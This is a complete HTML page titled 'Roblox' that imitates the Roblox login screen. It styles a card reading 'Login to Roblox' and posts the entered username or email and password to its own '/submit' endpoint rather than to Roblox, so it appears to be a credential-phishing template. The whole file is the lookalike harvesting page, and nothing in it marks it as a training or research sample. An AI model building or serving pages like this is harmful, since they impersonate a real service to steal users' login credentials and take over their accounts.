<!doctype html>
<html><head><meta charset="utf-8"><title>Roblox</title>
<style>
body{background:#f2f4f5;font-family:SourceSansPro,Helvetica,Arial,sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;}
.card{background:#fff;border:1px solid #e3e5e8;border-radius:8px;padding:32px;width:380px;text-align:center;}
h1{color:#232527;font-size:22px;margin:0 0 24px;}
input{width:100%;padding:12px;margin:6px 0;background:#f2f4f5;border:1px solid #b8b8b8;border-radius:4px;box-sizing:border-box;font-size:14px;}
button{width:100%;padding:12px;background:#00b06f;color:#fff;border:none;border-radius:4px;cursor:pointer;font-weight:600;margin-top:12px;}
</style></head>
<body><div class="card"><h1>Login to Roblox</h1>
<form method="POST" action="/submit">
<input type="text" name="username" placeholder="Username/Email" required autofocus>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form></div></body></html>
